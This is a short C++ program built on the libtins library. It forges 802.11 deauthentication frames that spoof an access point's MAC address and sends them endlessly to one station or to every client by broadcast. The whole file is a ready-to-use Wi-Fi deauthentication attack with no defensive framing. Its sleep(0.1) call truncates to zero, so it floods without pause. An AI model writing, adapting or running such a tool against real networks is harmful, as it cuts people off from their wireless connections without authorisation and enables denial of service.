#include <tins/tins.h>
#include <cassert>
#include <iostream>
#include <string>
#include <unistd.h>

using namespace Tins;
using namespace std;

int main(int argc, char * argv[] ) {
	if(argc <= 2 || argc >= 5){
		cout << "using <interface> <ap mac> [<station mac>]" << endl;
		return -1;
	}
	
	string interface = argv[1];
    string ap_mac = argv[2];
    string dst_mac;
    Dot11Deauthentication deauth;

	if(argc == 4)
		dst_mac = argv[3];

	else if(argc == 3)
		dst_mac = "ff:ff:ff:ff:ff:ff";
	
    deauth.addr1(dst_mac);
    deauth.addr2(ap_mac);
    deauth.addr3(deauth.addr2());

    RadioTap radio = RadioTap() / deauth;

    while(1){	
        PacketSender sender(interface);
        sender.send(radio);
        sleep(0.1);
    }
}	
